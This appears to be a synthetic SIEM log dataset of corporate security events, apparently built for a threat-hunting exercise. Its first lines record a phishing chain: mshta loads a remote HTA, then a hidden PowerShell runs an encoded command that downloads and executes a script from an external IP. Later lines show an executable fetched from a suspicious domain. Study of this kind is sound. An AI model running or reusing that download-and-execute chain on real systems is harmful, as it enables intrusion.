{"_time": "2026-10-02T09:24:00Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\mshta.exe", "ParentImage": "C:\\Program Files\\Internet Explorer\\iexplore.exe", "CommandLine": "mshta.exe https://corp-secure-hr.com/download/Payroll_Form.hta"}
{"_time": "2026-10-02T09:24:20Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwA0ADUALgAxADQAMQAuADUANQAuADkAOQAvAHMALgBwAHMAMQAp"}
{"_time": "2026-10-02T09:24:25Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.5.34", "query": "corp-secure-hr.com", "answer": "45.141.55.99", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T09:24:40Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.5.34", "dest_ip": "45.141.55.99", "dest_port": 443, "protocol": "TCP", "bytes_sent": 800, "bytes_received": 61000}
{"_time": "2026-10-02T09:25:00Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 3, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "DestinationIp": "45.141.55.99", "DestinationPort": 443, "Protocol": "tcp"}
{"_time": "2026-10-02T09:25:35Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.66.10", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2550}
{"_time": "2026-10-02T09:26:00Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 11, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\mchen\\AppData\\Local\\Temp\\svc32.exe"}
{"_time": "2026-10-02T09:27:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4769, "TargetUserName": "mchen", "ServiceName": "krbtgt", "IpAddress": "10.10.5.34", "ResultCode": "0x0"}
{"_time": "2026-10-02T09:30:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.40.26", "url": "https://intranet.corp.local/page6", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 749}
{"_time": "2026-10-02T09:30:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 45, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T09:31:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "notifications@slack.com", "recipient": "mchen@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T09:32:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.44.36", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1638, "bytes_received": 22379}
{"_time": "2026-10-02T09:36:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.61.58", "query": "npmjs.org", "answer": "13.105.51.20", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T09:40:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-db01", "event": "sshd_failed", "user": "postgres", "src_ip": "10.10.41.30", "reason": "bad_password"}
{"_time": "2026-10-02T09:40:20Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-db01", "event": "sshd_accepted", "user": "postgres", "src_ip": "10.10.41.30", "method": "password"}
{"_time": "2026-10-02T09:46:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T09:47:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-db01", "event": "sshd_accepted", "user": "dnair", "src_ip": "10.10.43.40", "method": "publickey"}
{"_time": "2026-10-02T09:48:34Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\rfischer", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T09:53:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "kgupta", "src_ip": "10.10.58.94", "endpoint": "/api/notifications", "method": "GET", "status": 200, "response_time_ms": 281, "auth_result": "n/a"}
{"_time": "2026-10-02T09:54:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.61.86", "query": "slack.com", "answer": "13.67.204.252", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T09:56:06Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T09:58:21Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "asmith", "LogonId": "0x46da9"}
{"_time": "2026-10-02T10:00:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.40.32", "url": "https://intranet.corp.local/page12", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 843}
{"_time": "2026-10-02T10:00:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "updates@github.com", "recipient": "dnair@corp.local", "subject": "Your weekly digest", "attachment": "none", "url": "https://github.com/notifications", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T10:00:00Z", "sourcetype": "k8s_audit", "index": "cloud", "host": "k8s-node01", "verb": "get", "user": "system:serviceaccount:default:web-sa", "resource": "pods", "namespace": "prod", "status": 200}
{"_time": "2026-10-02T10:02:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.41.21", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1626, "bytes_received": 34098}
{"_time": "2026-10-02T10:03:32Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\tOlawale", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:05:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.41.21", "url": "https://intranet.corp.local/page1", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 552}
{"_time": "2026-10-02T10:05:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 24, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T10:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetObject", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T10:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T10:11:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.55.37", "query": "github.com", "answer": "13.76.88.72", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T10:12:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.20.55", "url": "https://shop-promo-free-gift.ru/win?id=5512", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0", "bytes_out": 340, "category": "newly_registered_domain"}
{"_time": "2026-10-02T10:12:04Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.20.55", "url": "https://shop-promo-free-gift.ru/download/invoice_8841.exe", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0", "bytes_out": 1850000}
{"_time": "2026-10-02T10:15:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "cdn.jsdelivr.net", "answer": "104.18.32.9", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T10:15:47Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:17:29Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\dnair", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:18:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.43.29", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 608, "bytes_received": 75563}
{"_time": "2026-10-02T10:20:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "jlopez", "src_ip": "10.10.42.22", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 91, "auth_result": "success"}
{"_time": "2026-10-02T10:20:57Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.57.20", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1435}
{"_time": "2026-10-02T10:21:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.64.58", "query": "github.com", "answer": "13.108.244.213", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T10:22:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.62.68", "query": "github.com", "answer": "13.79.65.60", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T10:26:31Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:27:08Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\tOlawale", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:30:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "kgupta", "src_ip": "10.10.43.29", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 151, "auth_result": "success"}
{"_time": "2026-10-02T10:32:31Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:34:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.45.37", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1381, "bytes_received": 46118}
{"_time": "2026-10-02T10:34:02Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:35:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.41.27", "url": "https://intranet.corp.local/page7", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 327}
{"_time": "2026-10-02T10:35:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 44, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T10:38:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "orders", "rows_returned": 24, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T10:40:10Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:40:16Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\intern_kpatel", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T10:42:43Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.65.61", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4028}
{"_time": "2026-10-02T10:54:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.47.21", "query": "github.com", "answer": "13.88.63.193", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T11:00:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4725, "TargetUserName": "former_emp01", "SubjectUserName": "it_admin"}
{"_time": "2026-10-02T11:03:25Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "it_admin", "LogonId": "0x37afd"}
{"_time": "2026-10-02T11:04:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.42.22", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1414, "bytes_received": 20289}
{"_time": "2026-10-02T11:05:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.41.33", "url": "https://intranet.corp.local/page13", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 833}
{"_time": "2026-10-02T11:05:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4738, "TargetUserName": "rfischer", "SubjectUserName": "it_admin", "changed_attr": "userAccountControl"}
{"_time": "2026-10-02T11:06:06Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-MKT-007", "EventCode": 1, "User": "CORP\\dnair", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T11:06:43Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "tOlawale", "LogonId": "0xbd7d5"}
{"_time": "2026-10-02T11:10:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.42.22", "url": "https://intranet.corp.local/page2", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 818}
{"_time": "2026-10-02T11:10:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 23, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T11:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T11:12:34Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T11:14:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "rfischer", "src_ip": "10.10.44.18", "method": "publickey"}
{"_time": "2026-10-02T11:15:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.41.21", "query": "cdn.jsdelivr.net", "answer": "104.18.32.9", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T11:20:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.44.30", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1314, "bytes_received": 87181}
{"_time": "2026-10-02T11:26:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "intern_kpatel", "src_ip": "10.10.50.95", "endpoint": "/api/dashboard", "method": "GET", "status": 200, "response_time_ms": 279, "auth_result": "n/a"}
{"_time": "2026-10-02T11:30:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "it_admin", "src_ip": "10.10.43.23", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 138, "auth_result": "success"}
{"_time": "2026-10-02T11:30:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.57.77", "query": "github.com", "answer": "13.87.191.141", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T11:36:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.38", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 918, "bytes_received": 14156}
{"_time": "2026-10-02T11:37:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.49.91", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 8695, "bytes_received": 121756}
{"_time": "2026-10-02T11:40:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.42.28", "url": "https://intranet.corp.local/page8", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 587}
{"_time": "2026-10-02T11:40:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "pwong", "src_ip": "10.10.44.30", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 196, "auth_result": "success"}
{"_time": "2026-10-02T11:40:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 42, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T11:55:10Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\jlopez", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T11:58:36Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
